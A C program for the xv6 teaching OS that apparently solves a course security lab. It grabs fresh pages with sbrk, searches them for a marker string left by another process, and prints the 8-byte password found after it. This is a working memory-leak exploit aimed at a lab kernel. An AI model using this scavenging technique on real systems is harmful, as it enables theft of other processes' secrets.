#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
	int i;
	char *start_adr;
	// String that helps to verify whether the page has
	// the secret code or not.
	char *message = "very very secret pw is: ";
	char message_check[25];
	char secret[8];
	for(i = 0; i < 32; i++){
		start_adr = sbrk(PGSIZE);
		// Get the 24 byte long data from the potential
		// message location.
		memcpy(message_check, start_adr+8, 24);
		message_check[24] = 0;
		if(strcmp(message, message_check) == 0){ // Compare with the message
			memcpy(secret, start_adr+32, 8);
			write(2, secret, 8);
			break;
		}
	}
  exit(0);
}
